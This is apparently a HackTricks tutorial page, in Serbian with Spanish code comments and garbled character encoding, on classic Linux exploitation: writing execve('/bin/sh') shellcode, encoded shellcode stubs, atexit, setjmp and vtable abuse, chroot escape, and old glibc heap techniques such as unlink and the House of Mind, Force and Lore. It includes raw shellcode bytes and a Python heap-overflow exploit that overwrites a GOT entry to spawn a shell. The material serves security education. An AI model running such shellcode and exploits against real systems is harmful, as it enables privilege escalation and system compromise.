# Linux Exploiting (Osnovno)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **2.SHELLCODE**

Vidi prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; Äistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleÄ‘ivanje\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; IzvrÅ¡iti syscall

**nasm -f elf assembly.asm** â€”> VraÄ‡a nam .o datoteku\
**ld assembly.o -o shellcodeout** â€”> Daje nam izvrÅ¡nu datoteku formiranu od asemblerskog koda i moÅ¾emo izvuÄ‡i opkodove sa **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Da bismo videli da je zaista naÅ¡ shellcode i izvukli OpKodove

**Proverite da li shellcode funkcioniÅ¡e**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Da biste videli da li se sistemski pozivi pravilno izvrÅ¡avaju, treba da kompajlirate prethodni program i sistemski pozivi treba da se pojave u **strace ./PROGRAMA\_COMPILADO**

Prilikom kreiranja shellcode-ova moÅ¾ete koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodatno stavlja EIP na stek. Nakon instrukcije poziva smo ubacili string koji nam je potreban, tako da sa tim EIP-om moÅ¾emo pokazati na string i nastaviti izvrÅ¡avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**EKSPLOATISANJE koriÅ¡Ä‡enjem Stack-a (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Lovac na jaja:**

Ovo je mali kod koji prolazi kroz stranice memorije povezane s procesom u potrazi za shellcode-om koji je tamo spremljen (traÅ¾i neki potpis koji je postavljen u shellcode-u). Korisno u sluÄajevima kada imate samo malo prostora za ubacivanje koda.

**Polimorfni shellkodovi**

To su Å¡ifrovani shellkodovi koji imaju male kodove koji ih deÅ¡ifruju i skoÄe na njih, koristeÄ‡i trik Call-Pop, ovde je **primer Cezarove Å¡ifre**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Dodatne metode**





**Muratova tehnika**

Na linuxu se svi programi mapiraju poÄevÅ¡i od 0xbfffffff

PosmatrajuÄ‡i kako se konstruiÅ¡e stek novog procesa u linuxu, moÅ¾e se razviti exploit tako da program bude pokrenut u okruÅ¾enju u kojem je jedina promenljiva shellcode. Adresa ove promenljive se moÅ¾e izraÄunati kao: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Na ovaj naÄin se na jednostavan naÄin moÅ¾e dobiti adresa gde se nalazi promenljiva okoline sa shellcode.

Ovo se moÅ¾e postiÄ‡i zahvaljujuÄ‡i tome Å¡to funkcija execle omoguÄ‡ava kreiranje okruÅ¾enja koje ima samo Å¾eljene promenljive okoline.



##

###

###

###

###

### **Formatiranje stringova za preplavljivanje bafera**

**sprintf** pomera formatiran string u promenljivu. Stoga, moÅ¾ete zloupotrebiti formatiranje stringa kako biste izazvali preplavljivanje bafera u promenljivoj u koju se kopira sadrÅ¾aj. Na primer, payload `%.44xAAAA` Ä‡e upisati 44B+"AAAA" u promenljivu, Å¡to moÅ¾e izazvati preplavljivanje bafera.

### **Strukture \_\_atexit**

{% hint style="danger" %}
Danas je vrlo retko iskoristiti ovo.
{% endhint %}

**`atexit()`** je funkcija kojoj se prosleÄ‘uju druge funkcije kao parametri. Ove funkcije Ä‡e biti izvrÅ¡ene prilikom izvrÅ¡avanja `exit()` ili povratka iz glavnog programa. Ako moÅ¾ete da modifikujete adresu bilo koje od ovih funkcija da pokazuje na shellcode na primer, preuzete Ä‡ete kontrolu nad procesom, ali je to trenutno komplikovanije. Trenutno su adrese funkcija koje treba izvrÅ¡iti sakrivene iza nekoliko struktura i na kraju adrese na koje pokazuju nisu adrese funkcija, veÄ‡ su Å¡ifrovane sa XOR-om i pomerajima sa sluÄajnim kljuÄem. Tako da je ovaj vektor napada trenutno vrlo malo koristan, barem na x86 i x64\_86 arhitekturama. Funkcija za Å¡ifrovanje je `PTR_MANGLE`. **Druge arhitekture** poput m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju funkciju za Å¡ifrovanje** jer **vraÄ‡aju isto** Å¡to su primile kao ulaz. Dakle, ove arhitekture bi bile podloÅ¾ne ovom vektoru napada.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Danas je vrlo retko iskoristiti ovo.
{% endhint %}

**`Setjmp()`** omoguÄ‡ava **Äuvanje konteksta** (registara)\
**`longjmp()`** omoguÄ‡ava **obnavljanje konteksta**.\
SaÄuvani registri su: `EBX, ESI, EDI, ESP, EIP, EBP`\
Ono Å¡to se deÅ¡ava je da se EIP i ESP prosleÄ‘uju kroz funkciju **`PTR_MANGLE`**, tako da su **arhitekture podloÅ¾ne ovom napadu iste kao i gore navedene**.\
Koriste se za oporavak greÅ¡aka ili prekide.\
MeÄ‘utim, prema onome Å¡to sam proÄitao, ostali registri nisu zaÅ¡tiÄ‡eni, **tako da ako postoji `call ebx`, `call esi` ili `call edi`** unutar funkcije koja se poziva, kontrola moÅ¾e biti preuzeta. Ili takoÄ‘e moÅ¾ete modifikovati EBP da biste promenili ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtabelu** koja je niz **pokazivaÄa na metode**.

Svaki objekat **klase** ima **VPtr** koji je **pokazivaÄ** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, tako da ako se postigne **prepisivanje** VPtr-a, moÅ¾e se **modifikovati** da pokazuje na laÅ¾nu metodu tako da izvrÅ¡avanje funkcije ode do shellcode-a.

## **Prevantivne mere i izbegavanja**

###

**Zamena Libsafe-a**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

Pozivi nekih nesigurnih funkcija se presreÄ‡u sigurnijim. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne statiÄke kompilacije, ne sve ranjive funkcije postaju sigurne i LD\_PRELOAD ne radi na binarnim fajlovima sa suid).

**ASCII Armored Address Space**

Sastoji se od uÄitavanja deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. MeÄ‘utim, ovo zaista ne zaustavlja skoro nijedan napad, a posebno ne u little endian formatu.

**ret2plt**

Sastoji se od izvoÄ‘enja ROP-a tako da se pozove funkcija strcpy@plt (iz plt-a) i usmeri se ka ulazu u GOT i kopira prvi bajt funkcije koja se Å¾eli pozvati (system()). Zatim se isto radi usmeravajuÄ‡i se ka GOT+1 i kopira se drugi bajt system()... Na kraju se poziva saÄuvana adresa u GOT koja Ä‡e biti system()

**Kavezi sa chroot()**

debootstrap -arch=i386 hardy /home/user â€”> Instalira osnovni sistem u odreÄ‘eni poddirektorijum

Administrator moÅ¾e izaÄ‡i iz ovih kaveza tako Å¡to Ä‡e uraditi: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind â€”> TraÅ¾i greÅ¡ke\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Preplavljivanje hipa: Osnovni eksploiti**

**Dodeljeni blok**

prev\_size |\
size | â€”Zaglavlje\
\*mem | Podaci

**Slobodan blok**

prev\_size |\
size |\
\*fd | Ptr naprednog bloka\
\*bk | Ptr nazadnog bloka â€”Zaglavlje\
\*mem | Podaci

Slobodni blokovi su u listi dvostruko povezanih (bin) i nikada ne mogu biti dva slobodna bloka zajedno (spajaju se)

U "size" postoje bitovi koji pokazuju: Da li je prethodni blok u upotrebi, da li je blok dodeljen putem mmap() i da li blok pripada primarnoj areni.

Ako se oslobodi blok i bilo koji od susednih blokova je slobodan, oni se spajaju pomoÄ‡u makroa unlink() i novi, veÄ‡i blok se prosleÄ‘uje frontlink() da ga ubaci u odgovarajuÄ‡i bin.

unlink(){\
BK = P->bk; â€”> BK novog bloka je onaj koji je imao blok koji je veÄ‡ bio slobodan\
FD = P->fd; â€”> FD novog bloka je onaj koji je imao blok koji je veÄ‡ bio slobodan\
FD->bk = BK; â€”> BK sledeÄ‡eg bloka pokazuje na novi blok\
BK->fd = FD; â€”> FD prethodnog bloka pokazuje na novi blok\
}

Dakle, ako uspemo da modifikujemo P->bk sa adresom shellcode-a i P->fd sa adresom unosa u GOT ili DTORS manje 12, postiÅ¾e se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

I tako se izvrÅ¡ava shellcode prilikom izlaska iz programa.

TakoÄ‘e, 4. izjava unlink() piÅ¡e neÅ¡to i shellcode mora biti prilagoÄ‘en za ovo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Ovo uzrokuje pisanje 4 bajta poÄevÅ¡i od 8. bajta shellcode-a, tako da prva instrukcija shellcode-a mora biti skok kako bi preskoÄila ovo i preÅ¡la na nops koji vode do ostatka shellcode-a.

Stoga se exploit kreira:

U buffer1 ubacujemo shellcode poÄevÅ¡i od skoka kako bi preÅ¡ao na nops ili na ostatak shellcode-a.

Nakon shellcode-a ubacujemo punjenje dok ne doÄ‘emo do polja prev\_size i size sledeÄ‡eg bloka. Na ovim mestima ubacujemo 0xfffffff0 (tako da se prev\_size prepiÅ¡e da ima bit koji kaÅ¾e da je slobodan) i â€œ-4â€œ(0xfffffffc) u size (da bi kada proveri u 3. bloku da li je 2. bio slobodan, zapravo ode na modifikovani prev\_size koji Ä‡e reÄ‡i da je slobodan) -> Tako kada free() istraÅ¾uje, iÄ‡i Ä‡e na size 3. ali Ä‡e zapravo iÄ‡i na 2. - 4 i misliÄ‡e da je 2. blok slobodan. Tada Ä‡e pozvati **unlink()**.
Prilikom poziva unlink() koristiÄ‡e se prvi podaci iz 2. dela, tako da Ä‡e se tu ubaciti adresa koju Å¾elite da prepisujete - 12 (jer Ä‡e u FD->bk dodati 12 na adresu saÄuvanu u FD). Na toj adresi Ä‡e se uneti druga adresa koja se nalazi u 2. delu, a koja Ä‡e biti adresa shell koda (P->bk laÅ¾ni).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtova punjenja**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Bit koji oznaÄava da je prethodni deo slobodan treba da bude 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, da bi mislio da je "size" 3. dela 4 bajta unazad (ukazuje na prev\_size) jer tu proverava da li je 2. deo slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #U payloadu na poÄetku Ä‡emo staviti 8 bajtova punjenja**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biÄ‡e adresa koja Ä‡e biti prepisana da bi se pokrenuo shell kod drugi put kada se pozove free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Kako je reÄeno, payload poÄinje sa 8 bajtova punjenja jer tako**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Menja se 2. deo, got\_free pokazuje gde Ä‡emo saÄuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobaÄ‘anje u obrnutom redosledu (wargame)**

KontroliÅ¡emo 3 uzastopna chunk-a i oslobaÄ‘aju se u obrnutom redosledu od rezervisanja.

U tom sluÄaju:

U chunk c se stavlja shell kod

Chunk a koristimo da prepisujemo b tako da size ima deaktiviran bit PREV\_INUSE tako da misli da je chunk a slobodan.

TakoÄ‘e, u zaglavlju b se prepisuje size da bude -4.

Zatim, program Ä‡e misliti da je "a" slobodan i u binu, pa Ä‡e pozvati unlink() da ga odvoji. MeÄ‘utim, poÅ¡to je PREV\_SIZE u zaglavlju -4, misliÄ‡e da deo "a" zapravo poÄinje na b+4. Drugim reÄima, pozvaÄ‡e unlink() na deo koji poÄinje na b+4, tako da Ä‡e na b+12 biti pokazivaÄ "fd", a na b+16 Ä‡e biti pokazivaÄ "bk".

Na taj naÄin, ako stavimo adresu shell koda u bk i adresu funkcije "puts()" -12 u fd, imamo naÅ¡ payload.

**Tehnika Frontlink**

Poziva se frontlink kada se neÅ¡to oslobodi i nijedan od susednih delova nije slobodan, ne poziva se unlink() veÄ‡ se direktno poziva frontlink().

Korisna ranjivost kada malloc koji se napada nikada nije osloboÄ‘en (free()).

Potrebno je:

Buffer koji moÅ¾e biti preplavljen funkcijom za unos podataka

Buffer koji je susedan ovom koji treba da se oslobodi i Äiji Ä‡e se polje fd u zaglavlju promeniti zbog prelivanja prethodnog bafera

Buffer koji treba osloboditi sa veliÄinom veÄ‡om od 512 ali manjom od prethodnog bafera

Buffer koji je deklarisan pre koraka 3 koji omoguÄ‡ava prepisivanje prev\_size ovog bafera

Na ovaj naÄin, preplavljujuÄ‡i dva malloc-a na nekontrolisan naÄin i jedan na kontrolisan naÄin koji se oslobaÄ‘a samo jednom, moÅ¾emo napraviti eksploit.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaÄem, dva bin-a pokazuju na istu adresu.

U sluÄaju da Å¾elimo ponovo koristiti jedan, to se moÅ¾e uraditi bez problema. U sluÄaju da Å¾elimo koristiti drugi, dodeliÄ‡e se isti prostor, tako da bismo imali laÅ¾ne pokazivaÄe "fd" i "bk" sa podacima koje Ä‡e upisati prethodna rezervacija.

**After free()**

Prethodno osloboÄ‘eni pokazivaÄ se ponovo koristi bez kontrole.

## **8 Heap Overflow: Napredni eksploiti**

Tehnike Unlink() i FrontLink() su uklonjene modifikacijom funkcije unlink().

**The house of mind**

Samo jedan poziv free() je potreban da bi se izvrÅ¡io proizvoljni kod. Bitno je pronaÄ‡i drugi deo koji moÅ¾e biti preplavljen od strane prethodnog i osloboÄ‘en.

Poziv free() dovodi do poziva public\_fREe(mem), koji radi:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> VraÄ‡a pokazivaÄ na adresu na kojoj poÄinje deo (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

U \[1] proverava polje size bit NON\_MAIN\_ARENA, koje se moÅ¾e promeniti da bi provera vratila taÄno i izvrÅ¡ila heap\_for\_ptr() koja vrÅ¡i and na "mem" ostavljajuÄ‡i 0 poslednjih 2.5 bajtova (u naÅ¡em sluÄaju od 0x0804a000 ostavlja 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struct heap\_info)

Na ovaj naÄin, ako moÅ¾emo kontrolisati deo na primer na 0x0804a000 i deo na **0x081002a0** Ä‡e biti osloboÄ‘en, moÅ¾emo doÄ‡i do adrese 0x08100000 i upisati Å¡ta god Å¾elimo, na primer **0x0804a000**. Kada se ovaj drugi deo oslobodi, naÄ‡i Ä‡e da heap\_for\_ptr(ptr)->ar\_ptr vraÄ‡a ono Å¡to smo upisali na 0x08100000 (jer se primenjuje and na 0x081002a0 koji smo videli ranije i odatle se izvlaÄi vrednost prvih 4 bajta, ar\_ptr)

Na taj naÄin se poziva \_int\_free(ar\_ptr, mem), odnosno **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao Å¡to smo videli ranije, moÅ¾emo kontrolisati vrednost av, jer je to ono Å¡to piÅ¡emo u delu koji Ä‡e biti osloboÄ‘en.

Kako je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Stoga, ako u av->bins\[2] upiÅ¡emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji Ä‡e biti upisana vrednost u \_\_DTOR\_END\_\_ adresa drugog dela.

Drugim reÄima, na poÄetku prvog dela moramo staviti adresu \_\_DTOR\_END\_\_-12 mnogo puta jer Ä‡e av->bins\[2] to izvuÄ‡i.

Na adresi na koju padne adresa drugog dela sa poslednjih 5 nula, treba upisati adresu ovog prvog dela kako bi heap\_for\_ptr() mislio da je ar\_ptr na poÄetku prvog dela i izvukao av->bins\[2] odatle.
U drugom delu, zahvaljujuÄ‡i prvom, prepisujemo prev\_size sa jump 0x0c i size sa neÄim Å¡to aktivira -> NON\_MAIN\_ARENA

Zatim u delu 2 stavljamo puno nops-a i na kraju shellcode

Na taj naÄin Ä‡e se pozvati \_int\_free(TROZO1, TROZO2) i slijediti upute za pisanje u \_\_DTOR\_END\_\_ adresu prev\_size od TROZO2 koji Ä‡e skoÄiti na shellcode.

Za primenu ove tehnike potrebno je ispuniti joÅ¡ neke zahteve koji malo komplikuju payload.

Ova tehnika viÅ¡e nije primenjiva jer je primenjen gotovo isti zakrpa kao za unlink. UporeÄ‘uju se da li novi sajt na koji se pokazuje takoÄ‘e pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas izvrÅ¡avanje sledeÄ‡eg koda koji se dostiÅ¾e nakon prve provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gde je fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Na ovaj naÄin, ako se postavi u "fb" adresa funkcije u GOT-u, na toj adresi Ä‡e se postaviti adresa prepisanog dela. Za ovo Ä‡e biti potrebno da je arena blizu adresa dtors-a. TaÄnije, av->max\_fast treba da bude adresa koju Ä‡emo prepisati.

S obzirom da smo sa The House of Mind videli da mi kontroliÅ¡emo poziciju av.

Zato ako u polje size stavimo veliÄinu 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() Ä‡e vratiti fastbins\[-1], koji Ä‡e pokazivati na av->max\_fast

U ovom sluÄaju av->max\_fast Ä‡e biti adresa koja Ä‡e biti prepisana (ne na koju pokazuje, veÄ‡ ta pozicija Ä‡e biti prepisana).

TakoÄ‘e, mora se ispuniti uslov da susedni deo osloboÄ‘enog dela bude veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog dela 8, u ovom laÅ¾nom delu samo treba staviti veliÄinu veÄ‡u od 8 (kako Ä‡e shellcode biti u osloboÄ‘enom delu, na poÄetku treba staviti skok koji Ä‡e pasti na nops).

TakoÄ‘e, isti laÅ¾ni deo mora biti manji od av->system\_mem. av->system\_mem je udaljen 1848 bajtova.

Zbog nula u \_DTOR\_END\_ i malog broja adresa u GOT-u, nijedna adresa iz ovih sekcija nije pogodna za prepisivanje, pa pogledajmo kako primeniti fastbin za napad na stek.

JoÅ¡ jedan naÄin napada je preusmeravanje **av** ka steku.

Ako promenimo veliÄinu da bude 16 umesto 8, tada: fastbin\_index() Ä‡e vratiti fastbins\[0] i moÅ¾emo iskoristiti ovo da prepisujemo stek.

Za ovo ne sme biti nikakvih canary-ja ili Äudnih vrednosti na steku, zapravo moramo biti u ovom: 4 bajta nula + EBP + RET

Potrebna su 4 bajta nula kako bi **av** bio na toj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** Ä‡e biti EBP i biÄ‡e vrednost koja Ä‡e nam omoguÄ‡iti da preskoÄimo ograniÄenja.

U **av->fastbins\[0]** Ä‡e se prepisati adresa **p** i biÄ‡e RET, tako da Ä‡e se skoÄiti na shellcode.

TakoÄ‘e, u **av->system\_mem** (1484 bajta iznad pozicije na steku) Ä‡e biti dovoljno smeÄ‡a koje Ä‡e nam omoguÄ‡iti da preskoÄimo proveru koja se vrÅ¡i.

TakoÄ‘e, mora se ispuniti uslov da susedni deo osloboÄ‘enog dela bude veÄ‡i od 8 -> PoÅ¡to smo rekli da je veliÄina osloboÄ‘enog dela 16, u ovom laÅ¾nom delu samo treba staviti veliÄinu veÄ‡u od 8 (kako Ä‡e shellcode biti u osloboÄ‘enom delu, na poÄetku treba staviti skok koji Ä‡e pasti na nops koji dolaze nakon polja size novog laÅ¾nog dela).

**The House of Spirit**

U ovom sluÄaju traÅ¾imo da imamo pokazivaÄ na malloc koji moÅ¾e biti promenljiv od strane napadaÄa (na primer, da je pokazivaÄ na steku ispod moguÄ‡eg prelivanja promenljive).

Na taj naÄin, mogli bismo da usmerimo ovaj pokazivaÄ gde god Å¾elimo. MeÄ‘utim, ne svako mesto je validno, veliÄina laÅ¾nog dela mora biti manja od av->max\_fast i taÄnije jednaka veliÄini koja Ä‡e biti traÅ¾ena u buduÄ‡em pozivu malloc()+8. Zbog toga, ako znamo da se nakon ovog ranjivog pokazivaÄa poziva malloc(40), veliÄina laÅ¾nog dela mora biti jednaka 48.

Na primer, ako program pita korisnika za broj, mogli bismo uneti 48 i usmeriti promenljivi pokazivaÄ malloc-a na sledeÄ‡ih 4 bajta (koji bi mogli pripadati EBP-u sa sreÄ‡om, tako da 48 ostaje iza, kao da je veliÄina zaglavlja). TakoÄ‘e, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluÄaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

U sluÄaju da se ovo ispuni, kada se pozove sledeÄ‡i malloc koji smo rekli da je malloc(40), kao adresi Ä‡e biti dodeljena adresa EBP-a. Ukoliko napadaÄ takoÄ‘e moÅ¾e kontrolisati Å¡ta se piÅ¡e u ovom malloc-u, moÅ¾e prepisati kako EBP tako i EIP sa adresom koju Å¾eli.

Ovo mislim da je zato Å¡to kada se oslobodi free() ÄuvaÄ‡e da u adresi koja pokazuje na EBP steka postoji deo taÄne veliÄine za novi malloc() koji se Å¾eli rezervisati, pa Ä‡e mu dodeliti tu adresu.

**The House of Force**

Potrebno je:

* PrekoraÄenje u delu koje omoguÄ‡ava prepisivanje wilderness-a
* Poziv malloc() sa veliÄinom definisanom od strane korisnika
* Poziv malloc() Äiji podaci mogu biti definisani od strane korisnika

Prvo Å¡to se radi je prepisivanje veliÄine dela wilderness sa veoma velikom vrednoÅ¡Ä‡u (0xffffffff), tako da Ä‡e svaki zahtev za memorijom dovoljno velik biti obraÄ‘en u \_int\_malloc() bez potrebe za proÅ¡irivanjem hipa.

Drugo je promena av->top tako da pokazuje na deo memorije pod kontrolom napadaÄa, kao Å¡to je stek. U av->top Ä‡e se postaviti \&EIP - 8.

Mora se prepisati av->top kako bi pokazivao na deo memorije pod kontrolom napadaÄa:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost adrese trenutnog dela wilderness-a (trenutni av->top) i remainder je taÄno suma te adrese plus koliÄina bajtova traÅ¾ena od strane malloc(). Dakle, ako je \&EIP-8 na 0xbffff224 i av->top sadrÅ¾i 0x080c2788, tada je koliÄina koju moramo rezervisati u kontrolisanom malloc-u kako bi av->top pokazivao na $EIP-8 za sledeÄ‡i malloc():

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naÄin Ä‡e se saÄuvati promenjena vrednost u av->top i sledeÄ‡i malloc Ä‡e pokazivati na EIP i moÄ‡i Ä‡e ga prepisati.

VaÅ¾no je znati da veliÄina novog dela wilderness bude veÄ‡a od zahteva poslednjeg malloc(). Drugim reÄima, ako wilderness pokazuje na \&EIP-8, veliÄina Ä‡e biti taÄno u polju EBP steka.

**The House of Lore**

**Korupcija SmallBin**

OsloboÄ‘eni delovi se ubacuju u bin u zavisnosti od njihove veliÄine. Ali pre nego Å¡to se ubace, Äuvaju se u unsorted bins. Deo koji je osloboÄ‘en neÄ‡e odmah biti ubaÄen u svoj bin veÄ‡ Ä‡e ostati u unsorted bins. Zatim, ako se rezerviÅ¡e novi deo i prethodno osloboÄ‘eni moÅ¾e posluÅ¾iti, biÄ‡e vraÄ‡en, ali ako se rezerviÅ¡e veÄ‡i deo, osloboÄ‘eni deo u unsorted bins Ä‡e biti ubaÄen u odgovarajuÄ‡i bin.

Da bi se doÅ¡lo do ranjivog koda, zahtev za memorijom mora biti veÄ‡i od av->max\_fast (obiÄno 72) i manji od MIN\_LARGE\_SIZE (512).
Ako u binu postoji komad odgovarajuÄ‡e veliÄine zahtevanog, vraÄ‡a se taj nakon Å¡to se odvoji:

bck = victim->bk; Pokazuje na prethodni komad, jedina informacija koju moÅ¾emo promeniti.

bin->bk = bck; Pretposlednji komad postaje poslednji, u sluÄaju da bck pokazuje na stack sledeÄ‡eg rezervisanog komada, dodeliÄ‡e mu se ova adresa.

bck->fd = bin; Lista se zatvara tako Å¡to ovaj pokazuje na bin

Potrebno je:

Da se rezerviÅ¡u dva malloc-a, tako da se prvom moÅ¾e izazvati prelivanje nakon Å¡to je drugi osloboÄ‘en i ubaÄen u svoj bin (tj. rezervisan je malloc veÄ‡i od drugog komada pre prelivanja)

Da malloc rezervisan za koji je odabrana adresa od strane napadaÄa bude kontrolisan od strane napadaÄa.

Cilj je sledeÄ‡i, ako moÅ¾emo izazvati prelivanje na heap-u koji ima ispod sebe komad veÄ‡ osloboÄ‘en i u svom binu, moÅ¾emo promeniti njegov pokazivaÄ bk. Ako promenimo njegov pokazivaÄ bk i ovaj komad postane prvi na listi bin i rezerviÅ¡e se, bin Ä‡e biti prevaren i reÄ‡i Ä‡e mu se da je poslednji komad liste (sledeÄ‡i koji nudi) na laÅ¾noj adresi koju smo postavili (na stack ili GOT na primer). Zbog toga, ako se ponovo rezerviÅ¡e drugi komad i napadaÄ ima dozvole na njemu, dobiÄ‡e komad na Å¾eljenoj poziciji i moÄ‡i Ä‡e da piÅ¡e u njega.

